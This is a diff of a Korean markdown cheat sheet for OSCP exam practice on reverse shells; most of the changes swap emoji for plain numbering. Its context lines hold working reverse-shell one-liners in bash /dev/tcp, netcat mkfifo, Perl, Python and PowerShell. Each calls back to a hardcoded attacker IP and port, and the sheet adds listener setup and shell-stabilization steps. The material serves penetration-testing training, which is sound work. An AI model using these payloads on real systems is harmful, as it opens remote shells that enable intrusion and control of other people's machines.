@@ -17,7 +17,7 @@ Connection refused (Errno 111) 오류는 다음 중 하나입니다:
 
 ---
 
-## 1️⃣ 공격자 머신에서 리스너 설정
+## 1. 공격자 머신에서 리스너 설정
 
 ```bash
 # 공격자 머신에서 먼저 실행
@@ -101,16 +101,16 @@ nc -zv $LHOST $LPORT
 telnet $LHOST $LPORT
 ````
 
-## 4️⃣ 대체 리버스 쉘 방법
+## 4. 대체 리버스 쉘 방법
 
-### 📎 Bash 리버스 쉘
+### Bash 리버스 쉘
 
 ```bash
 LHOST="10.8.136.212"; LPORT=1234
 bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
 ```
 
-### 📎 Netcat 리버스 쉘 (전통적 방법)
+### Netcat 리버스 쉘 (전통적 방법)
 
 ```bash
 LHOST="10.8.136.212"; LPORT=1234
@@ -121,7 +121,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f" >> /tmp/reverse_shell.sh
 ```
 
-### 📎 Perl 리버스 쉘
+### Perl 리버스 쉘
 
 ```bash
 # $i=LHOST, $p=LPORT 로 수정해서 사용
@@ -130,7 +130,7 @@ perl -e 'use Socket;$i="10.8.136.212";$p=1234;socket(S,PF_INET,SOCK_STREAM,getpr
 
 ---
 
-## 5️⃣ TTY 쉘 안정화
+## 5. TTY 쉘 안정화
 
 ### 연결 후 즉시 실행
 
@@ -162,7 +162,7 @@ stty rows 38 cols 116
 
 ---
 
-## 6️⃣ 네트워크 문제 해결
+## 6. 네트워크 문제 해결
 
 ### 방화벽 확인 및 설정
 
@@ -189,7 +189,7 @@ nc -lvnp 4445
 
 ---
 
-## 7️⃣ OSCP 시험 허용 범위 내 도구
+## 7. OSCP 시험 허용 범위 내 도구
 
 ### 기본 도구만 사용 (OSCP 허용)
 
@@ -206,7 +206,7 @@ nc -lvnp 4445
 
 ---
 
-## 8️⃣ 실전 체크리스트
+## 8. 실전 체크리스트
 
 | 단계 | 확인 사항          | 명령어                                           |
 | ---- | ------------------ | ------------------------------------------------ |
@@ -220,7 +220,7 @@ nc -lvnp 4445
 
 ---
 
-## ⚠️ 주의사항
+## 주의사항
 
 1. IP 주소를 실제 공격자 머신 IP로 변경 필수
 2. 리스너를 먼저 실행한 후 타겟에서 연결 시도
@@ -228,7 +228,7 @@ nc -lvnp 4445
 4. VPN 사용시 tun0 인터페이스 IP 사용
 5. OSCP 시험에서는 수동 실행만 허용되므로 자동화 금지
 
-### 🔗 Bash
+### Bash
 
 ```bash
 LHOST="10.8.136.212"; LPORT=1234
@@ -239,7 +239,7 @@ bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
 exec 5<>/dev/tcp/$LHOST/$LPORT;cat <&5|while read line;do $line 2>&5 >&5;done
 ```
 
-### 🌊 PowerShell (Windows)
+### PowerShell (Windows)
 
 ```powershell
 $LHOST="10.8.136.212"
@@ -265,7 +265,7 @@ $LHOST="10.8.136.212"; $LPORT=1234; $client=New-Object System.Net.Sockets.TCPCli
 
 ---
 
-## 🎯 OSCP 허용 범위 내 방법들
+## OSCP 허용 범위 내 방법들
 
 ### 수동 실행 가능한 도구들:
 
@@ -276,7 +276,7 @@ $LHOST="10.8.136.212"; $LPORT=1234; $client=New-Object System.Net.Sockets.TCPCli
 5. PHP - 웹 서버 환경에서
 6. Ruby - 일부 시스템에 설치됨
 
-### 🚫 OSCP에서 금지되는 것들:
+### OSCP에서 금지되는 것들:
 
 - Meterpreter 사용
 - 자동화된 익스플로잇 도구
@@ -284,9 +284,9 @@ $LHOST="10.8.136.212"; $LPORT=1234; $client=New-Object System.Net.Sockets.TCPCli
 
 ---
 
-## 🔧 연결 테스트 및 디버깅
+## 연결 테스트 및 디버깅
 
-### 1️⃣ 기본 연결성 확인
+### 1. 기본 연결성 확인
 
 ```bash
 LHOST="10.8.136.212"; LPORT=1234
@@ -297,7 +297,7 @@ ping -c 2 $LHOST
 nc -zv $LHOST $LPORT
 ```
 
-### 2️⃣ 다른 포트로 테스트
+### 2. 다른 포트로 테스트
 
 ```bash
 LHOST="10.8.136.212"; LPORT=1234
@@ -308,7 +308,7 @@ nc -lvnp 8080
 python3 -c 'import socket,subprocess,os;LHOST="10.8.136.212";LPORT=1234;s=socket.socket();s.connect((LHOST,LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
 ```
 
-### 3️⃣ 바인드 쉘로 방향 변경
+### 3. 바인드 쉘로 방향 변경
 
 ```bash
 LPORT=1234
@@ -321,15 +321,15 @@ nc $LHOST $LPORT
 
 ---
 
-## 📋 언어별 장단점 비교
+## 언어별 장단점 비교
 
 | 언어   | 장점                    | 단점               | OSCP 추천도 |
 | ------ | ----------------------- | ------------------ | ----------- |
-| Python | 거의 모든 시스템에 존재 | 없음               | ⭐⭐⭐⭐⭐  |
-| Bash   | 기본 쉘, 빠름           | /dev/tcp 지원 필요 | ⭐⭐⭐⭐⭐  |
-| Netcat | 간단, 직관적            | 버전별 차이        | ⭐⭐⭐⭐    |
-| Perl   | 강력한 기능             | 복잡한 문법        | ⭐⭐⭐      |
-| PHP    | 웹 환경에서 유용        | PHP 설치 필요      | ⭐⭐⭐      |
-| Ruby   | 간결한 코드             | Ruby 설치 필요     | ⭐⭐        |
+| Python | 거의 모든 시스템에 존재 | 없음               | 5/5  |
+| Bash   | 기본 쉘, 빠름           | /dev/tcp 지원 필요 | 5/5  |
+| Netcat | 간단, 직관적            | 버전별 차이        | 4/5    |
+| Perl   | 강력한 기능             | 복잡한 문법        | 3/5      |
+| PHP    | 웹 환경에서 유용        | PHP 설치 필요      | 3/5      |
+| Ruby   | 간결한 코드             | Ruby 설치 필요     | 2/5        |
 
 ---
